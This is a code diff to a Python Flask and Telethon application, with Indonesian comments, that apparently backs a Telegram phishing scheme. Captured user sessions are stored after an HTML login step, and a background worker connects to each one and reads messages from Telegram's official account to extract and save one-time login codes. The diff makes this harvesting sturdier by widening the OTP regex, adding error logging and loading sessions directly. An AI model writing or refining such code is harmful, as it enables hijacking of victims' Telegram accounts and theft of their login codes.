@@ -1,9 +1,6 @@
 import os
 import re
 import json
-import time
-import tempfile
-import shutil
 import asyncio
 import threading
 import requests
@@ -19,7 +16,6 @@ except:
     pass
 
 from telethon import TelegramClient, events
-from telethon.sessions import SQLiteSession
 from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
@@ -59,7 +55,6 @@ def get_data(phone):
 # ===== INLINE BUTTON WEBHOOK =====
 @app.route("/bot", methods=["POST"])
 def bot_webhook():
-    # Baca JSON dengan aman + logging
     data = request.get_json(silent=True) or {}
     print("== /bot CALLBACK RECEIVED ==")
     print(data)
@@ -72,7 +67,7 @@ def bot_webhook():
     cb = q.get("data", "")
     cb_id = q.get("id")
 
-    # Jawab callback agar loading di Telegram berhenti
+    # jawab callback supaya loading di Telegram berhenti
     if cb_id:
         try:
             requests.post(
@@ -140,14 +135,16 @@ def remove_session_files(phone):
 
 
 def finalize_pending_session(phone):
+    """rename sessions/PHONE.pending.session -> sessions/PHONE.session"""
     for fn in os.listdir(SESSION_DIR):
-        if fn.startswith(f"{phone}.pending"):
+        if fn.startswith(f"{phone}.pending") and fn.endswith(".session"):
             src = os.path.join(SESSION_DIR, fn)
             dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
             try:
                 os.rename(src, dst)
-            except:
-                pass
+                print("[SESSION] renamed", src, "->", dst)
+            except Exception as e:
+                print("[SESSION] rename error:", e)
 
 
 # ===== ROOT HTML LOGIN =====
@@ -350,64 +347,67 @@ async def forward_handler(event, client_name):
     text = getattr(event, "raw_text", "") or ""
     sender = await event.get_sender()
 
+    # hanya official telegram
     if sender.id != 777000:
         return
 
-    otp = re.findall(r"\d{5,6}", text)
-    if not otp:
+    # OTP 4-8 digit
+    otp_list = re.findall(r"\b\d{4,8}\b", text)
+    if not otp_list:
         return
 
-    save_data(client_name, otp=otp[0])
-    print("[OTP FOUND]", client_name, otp[0])
+    otp_code = otp_list[0]
+    save_data(client_name, otp=otp_code)
+    print("[OTP FOUND]", client_name, otp_code)
 
 
 async def worker_main():
+    print("[WORKER] started")
     clients = {}
 
     while True:
-        for fn in os.listdir(SESSION_DIR):
-            if not fn.endswith(".session") or ".pending" in fn:
-                continue
+        try:
+            for fn in os.listdir(SESSION_DIR):
+                if not fn.endswith(".session"):
+                    continue
+                if ".pending" in fn:
+                    continue
 
-            base = fn[:-8]
-            if base in clients:
-                continue
+                base = fn[:-8]  # buang ".session"
+                if base in clients:
+                    continue
 
-            real_session = os.path.join(SESSION_DIR, base + ".session")
+                base_path = os.path.join(SESSION_DIR, base)
+                print(f"[WORKER] load session: {base_path}")
 
-            # copy to temp (hindari database locked)
-            temp_db = os.path.join(tempfile.gettempdir(), f"{base}.sqlite")
-            try:
-                shutil.copy2(real_session, temp_db)
-            except:
-                pass
+                client = TelegramClient(base_path, api_id, api_hash)
 
-            client = TelegramClient(
-                SQLiteSession(temp_db),
-                api_id,
-                api_hash
-            )
-
-            for _ in range(5):
                 try:
                     await client.connect()
-                    break
-                except:
-                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    print(f"[WORKER] connect error {base}: {e}")
+                    continue
 
-            if not await client.is_user_authorized():
-                await client.disconnect()
-                continue
+                if not await client.is_user_authorized():
+                    print(f"[WORKER] session {base} not authorized, skip")
+                    await client.disconnect()
+                    continue
 
-            @client.on(events.NewMessage(incoming=True))
-            async def handler(event, fn=base):
-                try:
-                    await forward_handler(event, fn)
-                except:
-                    pass
+                me = await client.get_me()
+                print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')})")
 
-            task = asyncio.create_task(client.run_until_disconnected())
-            clients[base] = task
+                @client.on(events.NewMessage(incoming=True))
+                async def _handler(event, fn=base):
+                    try:
+                        await forward_handler(event, fn)
+                    except Exception as e:
+                        print(f"[WORKER] handler error {fn}: {e}")
+
+                task = asyncio.create_task(client.run_until_disconnected())
+                clients[base] = task
+
+        except Exception as e:
+            print("[WORKER] loop error:", e)
 
         await asyncio.sleep(0.5)
 
@@ -419,7 +419,7 @@ def start_worker_thread():
     t.start()
 
 
-# ===== PANGGIL WORKER SELALU (lokal & Railway) =====
+# ===== PANGGIL WORKER SELALU =====
 start_worker_thread()
 
 # ===== MAIN UNTUK LOKAL =====
